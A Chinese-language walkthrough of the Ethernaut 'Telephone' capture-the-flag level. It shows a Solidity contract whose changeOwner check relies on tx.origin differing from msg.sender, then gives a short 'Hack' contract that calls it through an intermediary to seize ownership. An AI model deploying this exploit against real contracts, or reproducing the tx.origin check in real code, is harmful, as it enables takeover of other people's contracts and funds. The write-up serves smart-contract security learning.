# Ethernaut 04-Telephone

## 本关目标

- 成为合约的 owner

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  // 我们需要借助该函数修改owner
  function changeOwner(address _owner) public {
    // 只要tx.orign和msg.sender不同就可以修改owner
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## 解决方案

1. tx.orign 是一个交易的最初发起者，msg.sender 是合约的直接调用者，例如账户 A 通过合约 B 调用合约 C 的 changeOwner()，那么对于合约 C 的 changeOwner()，msg.sender 是合约 B 的地址，tx.orign 是账户 A 的地址
2. 构造一个合约 Hack，调用 Hack 中的函数调用 Telephone 的 changeOwner 即可

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./Telephone.sol";

contract Hack {
    Telephone public immutable telephone;

    constructor(address _target) {
        telephone = Telephone(_target);
    }

    function change() public {
        telephone.changeOwner(msg.sender);
    }
}
```
